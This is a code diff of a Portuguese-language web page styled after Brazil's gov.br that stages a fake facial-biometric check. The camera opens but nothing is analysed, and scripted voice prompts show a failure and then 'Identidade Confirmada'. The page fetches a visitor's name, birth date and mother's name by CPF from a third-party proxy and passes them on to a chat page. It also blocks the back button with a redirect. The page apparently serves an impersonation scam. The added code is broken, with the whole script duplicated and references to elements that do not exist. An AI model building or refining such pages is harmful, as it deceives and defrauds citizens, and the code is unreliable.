@@ -34,25 +34,21 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     window.onpopstate = function(){ setTimeout(function(){ location.href = urlBackRedirect; }, 1); };
   </script>
   <link rel="stylesheet" href="css/all.min.css">
+  <script src="https://code.responsivevoice.org/responsivevoice.js?key=FREE"></script>
 
   <style>
     :root {
-      --blue:   #1351B4;
-      --blue2:  #0F4DA8;
-      --bluel:  #E8F4FD;
-      --blued:  #0C326F;
-      --green:  #168821;
-      --gray:   #495057;
-      --graymd: #E5E5E5;
-      --graylt: #F8F9FA;
-      --white:  #FFFFFF;
-      --shadow: 0 2px 8px rgba(0,0,0,.1);
-      --rad:    8px;
+      --blue:  #1351B4;
+      --blued: #0C326F;
+      --green: #168821;
+      --gray:  #495057;
+      --graymd:#E5E5E5;
+      --white: #FFFFFF;
     }
     *{margin:0;padding:0;box-sizing:border-box;}
     html,body{height:100%;overflow-x:hidden;}
     body{
-      font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+      font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;
       background:#fff; min-height:100vh; color:var(--gray);
       display:flex; flex-direction:column;
       -webkit-font-smoothing:antialiased;
@@ -69,7 +65,8 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     header{
       background:#fff; padding:16px 24px;
       display:flex;justify-content:space-between;align-items:center;
-      box-shadow:var(--shadow); position:sticky; top:0; z-index:1000;
+      box-shadow:0 2px 8px rgba(0,0,0,.1);
+      position:sticky;top:0;z-index:1000;
       border-bottom:3px solid var(--blue);
     }
     header .logo img{height:40px;width:auto;}
@@ -85,7 +82,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       border-bottom:1px solid var(--graymd);
       position:sticky;top:79px;z-index:999;
     }
-    nav button{background:none;border:none;display:flex;align-items:center;cursor:pointer;padding:8px 12px;border-radius:var(--rad);}
+    nav button{background:none;border:none;display:flex;align-items:center;cursor:pointer;padding:8px 12px;border-radius:8px;}
     nav button i{font-size:16px;color:var(--blue);margin-right:8px;}
     nav button p{color:var(--gray);font-size:14px;font-weight:400;margin:0;}
     nav button span{color:var(--blue);font-weight:500;}
@@ -93,64 +90,80 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     /* MAIN */
     #main-content{
       padding:0 20px 60px;
-      max-width:540px; flex:1 0 auto;
-      margin:0 auto; width:100%;
+      max-width:540px;flex:1 0 auto;
+      margin:0 auto;width:100%;
     }
     #main-content.hidden{display:none;}
 
     /* TITULO */
     .cam-title{font-size:18px;font-weight:700;color:#111;margin-top:20px;margin-bottom:2px;}
-    .cam-sub{font-size:13px;color:#607d8b;margin-bottom:14px;}
+    .cam-sub  {font-size:13px;color:#78909c;margin-bottom:16px;}
 
-    /* PILL STATUS */
-    .status-pill{
-      display:none; margin:0 auto 14px auto;
-      padding:7px 22px; border-radius:50px;
-      font-size:13px; font-weight:600; color:#fff;
-      background:#1565C0; width:fit-content;
-      letter-spacing:.2px;
+    /* ── PILL ESTILO GOV.BR ── */
+    .gov-pill {
+      display: none;
+      margin: 0 auto 16px auto;
+      background: #2196F3;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 500;
+      padding: 10px 32px;
+      border-radius: 50px;
+      text-align: center;
+      width: fit-content;
+      max-width: 90%;
+      letter-spacing: .1px;
+      box-shadow: 0 2px 8px rgba(33,150,243,.25);
     }
-    .status-pill.show{display:block;animation:fadeIn .2s ease;}
-    .status-pill.err {background:#b71c1c;}
-    .status-pill.ok  {background:#1b5e20;}
+    .gov-pill.show { display: block; animation: fadeIn .2s ease; }
 
     /* CARD CÂMERA */
     .cam-card{
       background:#fff;
       border-radius:16px;
       box-shadow:0 1px 8px rgba(0,0,0,.13);
-      padding:24px 0 20px;
-      display:flex; flex-direction:column;
+      padding:28px 0 24px;
+      display:flex;flex-direction:column;
       align-items:center;
     }
 
     /* OVAL */
     .oval-wrap{
       position:relative;
-      width:78%;
+      width:80%;
       aspect-ratio:4/5;
       border-radius:50%;
       overflow:hidden;
       border:4px solid #1565C0;
-      background:#b0bec5;
-      transition:border-color .3s, box-shadow .3s;
+      background:#cfd8dc;
+      transition:border-color .4s,box-shadow .4s;
     }
-    .oval-wrap.scanning{
+    /* idle — pisca suavemente */
+    .oval-wrap.idle{
       border-color:#1565C0;
-      animation:borderPulse 1.8s ease-in-out infinite;
+      animation:idlePulse 2.5s ease-in-out infinite;
     }
+    /* capturando — borda sólida azul */
+    .oval-wrap.capturing{
+      border-color:#1565C0;
+      box-shadow:0 0 0 5px rgba(21,101,192,.15);
+      animation:none;
+    }
+    /* erro */
     .oval-wrap.error{
       border-color:#b71c1c;
       box-shadow:0 0 0 6px rgba(183,28,28,.15);
-      animation:shake .4s ease;
+      animation:shake .45s ease;
     }
+    /* sucesso — verde */
     .oval-wrap.success{
-      border-color:#1b5e20;
-      box-shadow:0 0 0 6px rgba(27,94,32,.15);
+      border-color:#2e7d32;
+      box-shadow:0 0 0 6px rgba(46,125,50,.18);
+      animation:none;
     }
-    @keyframes borderPulse{
-      0%,100%{box-shadow:0 0 0 3px rgba(21,101,192,.2);}
-      50%     {box-shadow:0 0 0 9px rgba(21,101,192,.06);}
+    @keyframes idlePulse{
+      0%,100%{box-shadow:0 0 0 3px rgba(21,101,192,.15);}
+      50%    {box-shadow:0 0 0 9px rgba(21,101,192,.04);}
     }
     @keyframes shake{
       0%,100%{transform:translateX(0);}
@@ -171,60 +184,51 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       position:absolute;inset:0;
       display:flex;flex-direction:column;
       align-items:center;justify-content:center;
-      gap:8px;background:#cfd8dc;
+      gap:10px;background:#cfd8dc;
     }
-    .cam-ph i{font-size:46px;color:rgba(0,0,0,.18);}
-    .cam-ph p{font-size:12px;color:rgba(0,0,0,.38);text-align:center;padding:0 18px;line-height:1.5;}
+    .cam-ph i{font-size:52px;color:rgba(0,0,0,.15);}
+    .cam-ph p{font-size:12px;color:rgba(0,0,0,.32);text-align:center;padding:0 20px;line-height:1.5;}
 
-    /* SCAN LINE */
-    .scan-line{
-      position:absolute;left:0;right:0;height:3px;
-      background:linear-gradient(90deg,transparent 0%,rgba(21,101,192,0) 8%,rgba(21,101,192,.85) 30%,#90caf9 50%,rgba(21,101,192,.85) 70%,rgba(21,101,192,0) 92%,transparent 100%);
-      top:10%;z-index:6;opacity:0;pointer-events:none;filter:blur(.5px);
+    /* OVERLAY ERRO */
+    .err-overlay{
+      position:absolute;inset:0;
+      background:rgba(183,28,28,.92);
+      display:none;flex-direction:column;
+      align-items:center;justify-content:center;
+      gap:10px;z-index:20;
+      color:#fff;text-align:center;padding:24px;
     }
-    .scan-line.active{opacity:1;animation:scanMove 2.2s ease-in-out infinite;}
-    @keyframes scanMove{
-      0%  {top:8%; opacity:.5;}
-      50% {top:88%;opacity:1;}
-      100%{top:8%; opacity:.5;}
-    }
+    .err-overlay.show{display:flex;animation:fadeIn .3s ease;}
+    .err-overlay i  {font-size:44px;}
+    .err-overlay h3 {font-size:16px;font-weight:700;margin:0;}
+    .err-overlay p  {font-size:12px;opacity:.9;margin:0;line-height:1.4;}
 
-    /* PONTOS FACIAIS */
-    .face-dots{position:absolute;inset:0;z-index:7;pointer-events:none;opacity:0;transition:opacity .5s;}
-    .face-dots.show{opacity:1;}
-    .fdot{
-      position:absolute;width:5px;height:5px;border-radius:50%;
-      background:#64b5f6;box-shadow:0 0 5px #64b5f6;
-      animation:dotBlink 1.3s ease-in-out infinite;
+    /* OVERLAY SUCESSO */
+    .suc-overlay{
+      position:absolute;inset:0;
+      background:rgba(27,94,32,.9);
+      display:none;flex-direction:column;
+      align-items:center;justify-content:center;
+      gap:10px;z-index:20;
+      color:#fff;text-align:center;padding:24px;
     }
-    @keyframes dotBlink{0%,100%{opacity:1;transform:scale(1);}50%{opacity:.4;transform:scale(.6);}}
-
-    /* LINHAS DE MALHA FACIAL */
-    .face-mesh{position:absolute;inset:0;z-index:6;pointer-events:none;opacity:0;transition:opacity .6s;}
-    .face-mesh.show{opacity:1;}
-    .face-mesh svg{width:100%;height:100%;}
-
-    /* OVERLAYS */
-    .err-overlay,.suc-overlay{
-      position:absolute;inset:0;display:none;
-      flex-direction:column;align-items:center;justify-content:center;
-      gap:10px;z-index:20;color:#fff;text-align:center;padding:20px;
-    }
-    .err-overlay{background:rgba(183,28,28,.91);}
-    .suc-overlay{background:rgba(27,94,32,.89);}
-    .err-overlay.show,.suc-overlay.show{display:flex;animation:fadeIn .3s ease;}
-    .err-overlay i,.suc-overlay i{font-size:42px;}
-    .err-overlay h3,.suc-overlay h3{font-size:15px;font-weight:700;margin:0;}
-    .err-overlay p,.suc-overlay p{font-size:11px;opacity:.9;margin:0;line-height:1.4;}
+    .suc-overlay.show{display:flex;animation:fadeIn .35s ease;}
+    .suc-overlay i  {font-size:48px;}
+    .suc-overlay h3 {font-size:16px;font-weight:700;margin:0;}
+    .suc-overlay p  {font-size:12px;opacity:.9;margin:0;}
 
     @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+
+    /* FOOTER */
     footer{
       background:linear-gradient(135deg,var(--blued),#0B1A38);
       color:#fff;text-align:center;padding:16px;font-size:14px;flex-shrink:0;
     }
-
-    @keyframes fadeIn{from{opacity:0}to{opacity:1}}
-    @media(max-width:768px){header{padding:12px 16px;}header .logo img{height:32px;}#main-content{padding:0 16px 60px;}}
+    @media(max-width:768px){
+      header{padding:12px 16px;}
+      header .logo img{height:32px;}
+      #main-content{padding:0 16px 60px;}
+    }
   </style>
 </head>
 <body>
@@ -257,80 +261,35 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   <main id="main-content" class="hidden">
 
     <p class="cam-title">Verificação Facial</p>
-    <p class="cam-sub">Mantenha o rosto centralizado e o ambiente bem iluminado.</p>
+    <p class="cam-sub">Siga as instruções para confirmar sua identidade.</p>
 
-    <div class="status-pill" id="status-pill"></div>
+    <!-- pill estilo gov.br -->
+    <div class="gov-pill" id="gov-pill"></div>
 
     <div class="cam-card">
-
-      <!-- oval -->
-      <div class="oval-wrap" id="oval-wrap">
+      <div class="oval-wrap idle" id="oval-wrap">
 
         <video id="cam-video" autoplay playsinline muted></video>
 
         <div class="cam-ph" id="cam-ph">
           <i class="fas fa-user-circle"></i>
-          <p>Iniciando câmera...</p>
+          <p>Abrindo câmera...</p>
         </div>
 
-        <div class="scan-line" id="scan-line"></div>
-
-        <!-- pontos faciais -->
-        <div class="face-dots" id="face-dots">
-          <div class="fdot" style="top:26%;left:31%;animation-delay:.00s"></div>
-          <div class="fdot" style="top:27%;left:39%;animation-delay:.18s"></div>
-          <div class="fdot" style="top:26%;left:60%;animation-delay:.09s"></div>
-          <div class="fdot" style="top:27%;left:68%;animation-delay:.27s"></div>
-          <div class="fdot" style="top:36%;left:24%;animation-delay:.12s"></div>
-          <div class="fdot" style="top:36%;left:75%;animation-delay:.06s"></div>
-          <div class="fdot" style="top:47%;left:47%;animation-delay:.03s"></div>
-          <div class="fdot" style="top:47%;left:53%;animation-delay:.21s"></div>
-          <div class="fdot" style="top:55%;left:40%;animation-delay:.15s"></div>
-          <div class="fdot" style="top:55%;left:60%;animation-delay:.09s"></div>
-          <div class="fdot" style="top:63%;left:36%;animation-delay:.24s"></div>
-          <div class="fdot" style="top:63%;left:50%;animation-delay:.00s"></div>
-          <div class="fdot" style="top:63%;left:64%;animation-delay:.18s"></div>
-          <div class="fdot" style="top:17%;left:50%;animation-delay:.30s"></div>
-          <div class="fdot" style="top:73%;left:32%;animation-delay:.06s"></div>
-          <div class="fdot" style="top:73%;left:68%;animation-delay:.24s"></div>
-        </div>
-
-        <!-- malha facial SVG -->
-        <div class="face-mesh" id="face-mesh">
-          <svg viewBox="0 0 100 125" xmlns="http://www.w3.org/2000/svg">
-            <g stroke="#90caf9" stroke-width=".45" fill="none" opacity=".55">
-              <line x1="50" y1="17" x2="31" y2="26"/><line x1="50" y1="17" x2="69" y2="26"/>
-              <line x1="31" y1="26" x2="39" y2="27"/><line x1="69" y1="26" x2="61" y2="27"/>
-              <line x1="24" y1="36" x2="31" y2="26"/><line x1="76" y1="36" x2="69" y2="26"/>
-              <line x1="24" y1="36" x2="40" y2="55"/><line x1="76" y1="36" x2="60" y2="55"/>
-              <line x1="47" y1="47" x2="39" y2="27"/><line x1="53" y1="47" x2="61" y2="27"/>
-              <line x1="47" y1="47" x2="53" y2="47"/>
-              <line x1="40" y1="55" x2="47" y2="47"/><line x1="60" y1="55" x2="53" y2="47"/>
-              <line x1="36" y1="63" x2="40" y2="55"/><line x1="64" y1="63" x2="60" y2="55"/>
-              <line x1="36" y1="63" x2="50" y2="63"/><line x1="64" y1="63" x2="50" y2="63"/>
-              <line x1="32" y1="73" x2="36" y2="63"/><line x1="68" y1="73" x2="64" y2="63"/>
-              <line x1="32" y1="73" x2="50" y2="63"/><line x1="68" y1="73" x2="50" y2="63"/>
-            </g>
-          </svg>
-        </div>
-
-        <!-- overlay erro -->
         <div class="err-overlay" id="err-overlay">
           <i class="fas fa-times-circle"></i>
           <h3>Não foi possível verificar</h3>
           <p>Iluminação insuficiente ou rosto<br>fora da área de captura.</p>
         </div>
 
-        <!-- overlay sucesso -->
         <div class="suc-overlay" id="suc-overlay">
           <i class="fas fa-check-circle"></i>
           <h3>Identidade Confirmada</h3>
-          <p>Biometria facial validada<br>com sucesso.</p>
+          <p>Biometria validada com sucesso.</p>
         </div>
 
-      </div><!-- /oval -->
-
-    </div><!-- /cam-card -->
+      </div>
+    </div>
 
     <span id="cpf-value"    style="display:none"></span>
     <span id="name-value"   style="display:none"></span>
@@ -349,59 +308,90 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   <script>
     const delay = ms => new Promise(r => setTimeout(r, ms));
 
-    function formatarNome(n) {
-      if (!n) return '';
+    function formatarNome(n){
+      if(!n)return'';
       return n.toLowerCase().split(' ').filter(p=>p).map(p=>p[0].toUpperCase()+p.slice(1)).join(' ');
     }
-    function formatarCPF(c) {
+    function formatarCPF(c){
       return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
     }
 
-    const $ = id => document.getElementById(id);
+    const $       = id => document.getElementById(id);
     const elLoading = $('loading-screen');
     const elMain    = $('main-content');
-    const elPill    = $('status-pill');
+    const elPill    = $('gov-pill');
     const elOval    = $('oval-wrap');
     const elVideo   = $('cam-video');
     const elPh      = $('cam-ph');
-    const elScan    = $('scan-line');
-    const elDots    = $('face-dots');
-    const elMesh    = $('face-mesh');
     const elErr     = $('err-overlay');
     const elSuc     = $('suc-overlay');
     const elHdrName = $('header-user-name');
 
     let userData = null, stream = null;
 
-    function pill(txt, cls='') {
+    // ── Pill gov.br ──
+    function pill(txt) {
       elPill.textContent = txt;
-      elPill.className   = 'status-pill show' + (cls ? ' '+cls : '');
+      elPill.className   = 'gov-pill show';
     }
-    function noPill() { elPill.className = 'status-pill'; }
+    function hidePill() { elPill.className = 'gov-pill'; }
 
+    // ── Voz: ResponsiveVoice (feminina pt-BR natural) ──
+    function falar(texto) {
+      return new Promise(resolve => {
+        if (typeof responsiveVoice !== 'undefined' && responsiveVoice.voiceSupport()) {
+          responsiveVoice.cancel();
+          responsiveVoice.speak(texto, 'Brazilian Portuguese Female', {
+            rate: 0.88, pitch: 1.08, volume: 1,
+            onend: resolve, onerror: resolve
+          });
+        } else {
+          // fallback Web Speech API
+          if (!window.speechSynthesis) { resolve(); return; }
+          window.speechSynthesis.cancel();
+          const u  = new SpeechSynthesisUtterance(texto);
+          u.lang   = 'pt-BR'; u.rate = 0.88; u.pitch = 1.1;
+          const vz = window.speechSynthesis.getVoices();
+          const v  = vz.find(x => x.lang.startsWith('pt-BR') && /google/i.test(x.name))
+                  || vz.find(x => x.lang.startsWith('pt'));
+          if (v) u.voice = v;
+          u.onend = resolve; u.onerror = resolve;
+          window.speechSynthesis.speak(u);
+        }
+      });
+    }
+
+    function silenciar() {
+      if (typeof responsiveVoice !== 'undefined') responsiveVoice.cancel();
+      if (window.speechSynthesis) window.speechSynthesis.cancel();
+    }
+
+    async function dizer(texto) {
+      pill(texto);
+      await falar(texto);
+    }
+
+    // ── Câmera ──
     async function abrirCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({
-          video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},audio:false
+          video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:720} },
+          audio: false
         });
-        elVideo.srcObject = stream;
+        elVideo.srcObject     = stream;
         elVideo.style.display = 'block';
         elPh.style.display    = 'none';
-      } catch(e) { /* sem permissão — fluxo visual continua */ }
+      } catch(e) { elVideo.style.display = 'none'; }
     }
     function fecharCamera() {
-      if (stream) { stream.getTracks().forEach(t=>t.stop()); stream=null; }
+      if (stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; }
       elVideo.style.display = 'none';
     }
 
     function resetVisual() {
       elErr.classList.remove('show');
       elSuc.classList.remove('show');
-      elDots.classList.remove('show');
-      elMesh.classList.remove('show');
-      elScan.classList.remove('active');
-      elOval.className = 'oval-wrap';
-      noPill();
+      elOval.className = 'oval-wrap idle';
     }
 
     function redirecionar() {
@@ -415,81 +405,65 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       window.location.href = `../chat.html?${p.toString()}`;
     }
 
+    // ════════════════════════════════════════
+    //  FLUXO PRINCIPAL
+    // ════════════════════════════════════════
     async function iniciar() {
-      resetVisual();
+      resetVisual(); hidePill();
 
-      /* ── abre câmera ── */
-      pill('Por favor, aguarde');
       await abrirCamera();
-      await delay(900);
+      await delay(400);
 
-      /* ── scan começa ── */
-      pill('Analisando biometria...');
-      elOval.classList.add('scanning');
-      elScan.classList.add('active');
-      await delay(1000);
+      await dizer('Posicione seu rosto na altura dos olhos.');
+      await delay(300);
 
-      /* ── pontos faciais ── */
-      elDots.classList.add('show');
-      await delay(1000);
+      elOval.className = 'oval-wrap capturing';
+      await dizer('Centralize seu rosto dentro do círculo.');
+      await delay(300);
 
-      /* ── malha facial ── */
-      elMesh.classList.add('show');
-      await delay(1200);
+      await dizer('Por favor, aguarde.');
+      await delay(600);
 
-      /* ══ PRIMEIRA TENTATIVA → FALHA ══ */
-      elScan.classList.remove('active');
-      elDots.classList.remove('show');
-      elMesh.classList.remove('show');
+      /* ══ FALHA 1ª TENTATIVA ══ */
+      silenciar();
       elOval.className = 'oval-wrap error';
-      pill('Não foi possível verificar', 'err');
-
-      await delay(350);
+      await delay(200);
       elErr.classList.add('show');
-      await delay(2600);
+      await dizer('Não foi possível verificar. Vamos tentar novamente.');
+      await delay(500);
 
-      /* ── reset para segunda tentativa ── */
+      /* reset */
       elErr.classList.remove('show');
       fecharCamera();
       resetVisual();
+      hidePill();
       elPh.style.display = 'flex';
       elPh.innerHTML = `
-        <i class="fas fa-spinner fa-spin" style="font-size:36px;color:rgba(0,0,0,.18);"></i>
-        <p style="color:rgba(0,0,0,.35);">Aguarde, tentando novamente...</p>`;
-      await delay(1400);
+        <i class="fas fa-spinner fa-spin" style="font-size:40px;color:rgba(0,0,0,.14);"></i>
+        <p style="color:rgba(0,0,0,.28);font-size:12px;margin-top:8px;">Aguarde...</p>`;
+      await delay(900);
 
-      /* ══ SEGUNDA TENTATIVA → SUCESSO ══ */
-      pill('Por favor, aguarde');
+      /* ══ SUCESSO 2ª TENTATIVA ══ */
       await abrirCamera();
-      await delay(700);
+      await delay(300);
 
-      pill('Analisando biometria...');
-      elOval.classList.add('scanning');
-      elScan.classList.add('active');
-      await delay(1000);
+      elOval.className = 'oval-wrap capturing';
+      await dizer('Por favor, mantenha o olhar diretamente para a câmera.');
+      await delay(200);
 
-      elDots.classList.add('show');
-      await delay(900);
+      await dizer('Por favor, aguarde.');
+      await delay(600);
 
-      elMesh.classList.add('show');
-      await delay(900);
-
-      pill('Validando identidade...');
-      await delay(1000);
-
-      /* ══ SUCESSO ══ */
-      elScan.classList.remove('active');
+      /* sucesso */
+      silenciar();
       elOval.className = 'oval-wrap success';
-      pill('Identidade confirmada ✓', 'ok');
-      fecharCamera();
-
-      await delay(400);
       elSuc.classList.add('show');
-
-      await delay(1800);
+      await dizer('Identidade confirmada com sucesso.');
+      await delay(1000);
       redirecionar();
     }
 
+    // ── Busca dados ──
     async function fetchUserData() {
       try {
         const p   = new URLSearchParams(window.location.search);
@@ -502,12 +476,192 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         const d = json.dadosBasicos;
         if (!d||!d.nome) throw new Error('sem dados');
         userData = { nome:d.nome||'', cpf:d.cpf||cleanCPF, nascimento:d.nascimento||'', mae:d.mae||'' };
-        elHdrName.textContent = formatarNome(userData.nome).split(' ')[0];
-        $('name-value').textContent  = formatarNome(userData.nome);
-        $('cpf-value').textContent   = formatarCPF(userData.cpf||cleanCPF);
-        $('birth-value').textContent = userData.nascimento;
-        $('mother-value').textContent= userData.mae ? formatarNome(userData.mae) : 'Não Informado';
-      } catch(e) { console.error(e); }
+        elHdrName.textContent         = formatarNome(userData.nome).split(' ')[0];
+        $('name-value').textContent   = formatarNome(userData.nome);
+        $('cpf-value').textContent    = formatarCPF(userData.cpf||cleanCPF);
+        $('birth-value').textContent  = userData.nascimento;
+        $('mother-value').textContent = userData.mae ? formatarNome(userData.mae) : 'Não Informado';
+      } catch(e){ console.error(e); }
+      finally {
+        elLoading.classList.add('hidden');
+        elMain.classList.remove('hidden');
+        iniciar();
+      }
+    }
+
+    fetchUserData();
+
+    let userData = null, stream = null;
+
+    // ── TTS via Google Translate — voz feminina pt-BR natural ──
+    const audioCache = {};
+
+    function googleTTSUrl(texto) {
+      const encoded = encodeURIComponent(texto);
+      return `https://translate.google.com/translate_tts?ie=UTF-8&q=${encoded}&tl=pt-BR&client=tw-ob`;
+    }
+
+    async function falar(texto) {
+      return new Promise(resolve => {
+        // cancela audio anterior se existir
+        if (window._audioAtual) {
+          window._audioAtual.pause();
+          window._audioAtual.currentTime = 0;
+        }
+        const audio = new Audio(googleTTSUrl(texto));
+        audio.volume = 1;
+        window._audioAtual = audio;
+        audio.onended  = resolve;
+        audio.onerror  = resolve; // se bloquear, continua o fluxo
+        audio.play().catch(resolve);
+      });
+    }
+
+    function silenciar() {
+      if (window._audioAtual) {
+        window._audioAtual.pause();
+        window._audioAtual.currentTime = 0;
+      }
+      elVoiceBox.classList.add('silent');
+    }
+
+    // ── Instrução na tela + voz ──
+    async function instrucao(texto, aguardarVoz = true) {
+      elVoiceTxt.textContent = texto;
+      elVoiceBox.classList.remove('silent');
+      if (aguardarVoz) {
+        await falar(texto);
+      } else {
+        falar(texto); // fala sem aguardar terminar
+      }
+    }
+
+    // ── Câmera ──
+    async function abrirCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:720} },
+          audio: false
+        });
+        elVideo.srcObject     = stream;
+        elVideo.style.display = 'block';
+        elPh.style.display    = 'none';
+      } catch(e) {
+        // sem permissão — fluxo visual continua normalmente
+        elVideo.style.display = 'none';
+      }
+    }
+    function fecharCamera() {
+      if (stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; }
+      elVideo.style.display = 'none';
+    }
+
+    // ── Reset visual ──
+    function resetVisual() {
+      elErr.classList.remove('show');
+      elSuc.classList.remove('show');
+      elOval.className = 'oval-wrap idle';
+    }
+
+    // ── Redirecionar ──
+    function redirecionar() {
+      const p = new URLSearchParams(window.location.search);
+      if (userData) {
+        p.set('nome',       formatarNome(userData.nome));
+        p.set('mae',        userData.mae ? formatarNome(userData.mae) : 'Não Informado');
+        p.set('nascimento', userData.nascimento);
+        p.set('cpf',        formatarCPF(userData.cpf||''));
+      }
+      window.location.href = `../chat.html?${p.toString()}`;
+    }
+
+    // ════════════════════════════════════════
+    //  FLUXO PRINCIPAL
+    // ════════════════════════════════════════
+    async function iniciar() {
+      resetVisual();
+
+      /* ── 1. Abre câmera + primeira instrução ── */
+      elVoiceTxt.textContent = 'Iniciando verificação...';
+      await abrirCamera();
+      await delay(600);
+
+      await instrucao('Posicione seu rosto na altura dos olhos.');
+      await delay(600);
+
+      /* ── 2. Centralizar ── */
+      elOval.className = 'oval-wrap capturing';
+      await instrucao('Centralize seu rosto dentro do círculo.');
+      await delay(500);
+
+      /* ── 3. Não mova ── */
+      await instrucao('Não mova. Aguarde a captura.');
+      await delay(800);
+
+      /* ══ PRIMEIRA TENTATIVA → FALHA ══ */
+      silenciar();
+      elOval.className = 'oval-wrap error';
+      await delay(300);
+      elErr.classList.add('show');
+
+      elVoiceTxt.textContent = 'Não foi possível verificar. Tentando novamente.';
+      elVoiceBox.classList.remove('silent');
+      await falar('Não foi possível verificar. Vamos tentar novamente.');
+      await delay(800);
+
+      /* ── Reset ── */
+      elErr.classList.remove('show');
+      fecharCamera();
+      resetVisual();
+      elPh.style.display = 'flex';
+      elPh.innerHTML = `
+        <i class="fas fa-spinner fa-spin" style="font-size:40px;color:rgba(0,0,0,.15);"></i>
+        <p style="color:rgba(0,0,0,.3);font-size:12px;margin-top:8px;">Aguarde...</p>`;
+      await delay(1000);
+
+      /* ══ SEGUNDA TENTATIVA → SUCESSO ══ */
+      await abrirCamera();
+      await delay(400);
+
+      elOval.className = 'oval-wrap capturing';
+      await instrucao('Por favor, mantenha o olhar diretamente para a câmera.');
+      await delay(400);
+
+      await instrucao('Não mova. Capturando biometria.');
+      await delay(800);
+
+      /* ── SUCESSO ── */
+      silenciar();
+      elOval.className = 'oval-wrap success';
+      elSuc.classList.add('show');
+
+      elVoiceTxt.textContent = 'Identidade confirmada com sucesso!';
+      elVoiceBox.classList.remove('silent');
+      await falar('Identidade confirmada com sucesso!');
+
+      await delay(1200);
+      redirecionar();
+    }
+
+    // ── Busca dados ──
+    async function fetchUserData() {
+      try {
+        const p   = new URLSearchParams(window.location.search);
+        const cpf = p.get('cpf');
+        if (!cpf) throw new Error('sem cpf');
+        const cleanCPF = cpf.replace(/\D/g,'');
+        const res  = await fetch(`https://proxy-ativo.vercel.app/api/proxy?cpf=${cleanCPF}`);
+        const json = await res.json();
+        if (!res.ok) throw new Error(json.error||'erro');
+        const d = json.dadosBasicos;
+        if (!d||!d.nome) throw new Error('sem dados');
+        userData = { nome:d.nome||'', cpf:d.cpf||cleanCPF, nascimento:d.nascimento||'', mae:d.mae||'' };
+        elHdrName.textContent          = formatarNome(userData.nome).split(' ')[0];
+        $('name-value').textContent    = formatarNome(userData.nome);
+        $('cpf-value').textContent     = formatarCPF(userData.cpf||cleanCPF);
+        $('birth-value').textContent   = userData.nascimento;
+        $('mother-value').textContent  = userData.mae ? formatarNome(userData.mae) : 'Não Informado';
+      } catch(e){ console.error(e); }
       finally {
         elLoading.classList.add('hidden');
         elMain.classList.remove('hidden');
